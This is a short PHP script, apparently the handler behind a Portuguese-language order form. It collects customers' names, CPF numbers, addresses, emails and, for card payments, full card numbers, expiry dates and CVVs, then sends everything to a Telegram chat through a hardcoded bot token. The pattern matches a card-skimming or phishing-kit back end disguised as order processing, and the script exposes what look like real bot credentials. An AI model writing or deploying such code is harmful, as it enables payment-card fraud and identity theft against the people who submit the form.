<?php
$botToken = "7737548205:AAHoYv4emO06APmWUidIMnGU3xUdNuKUZgg";
$chatId = "6164096118";

$mensagem = "🎉 *Novo Pedido Recebido!* 🎉\n\n";
$mensagem .= "👤 *Nome:* " . $_POST['nome'] . "\n";
$mensagem .= "📄 *CPF:* " . $_POST['cpf'] . "\n";
$mensagem .= "🏠 *Endereço:* " . $_POST['endereco'] . "\n";
$mensagem .= "✉️ *Email:* " . $_POST['email'] . "\n";
$mensagem .= "💳 *Pagamento:* " . strtoupper($_POST['payment']) . "\n\n";

if ($_POST['payment'] == "cartao") {
    $mensagem .= "💳 *Cartão:* " . $_POST['numero_cartao'] . "\n";
    $mensagem .= "📅 *Expiração:* " . $_POST['data_expiracao'] . "\n";
    $mensagem .= "🔑 *CVV:* " . $_POST['cvv'] . "\n";
}

file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($mensagem) . "&parse_mode=Markdown");
?>
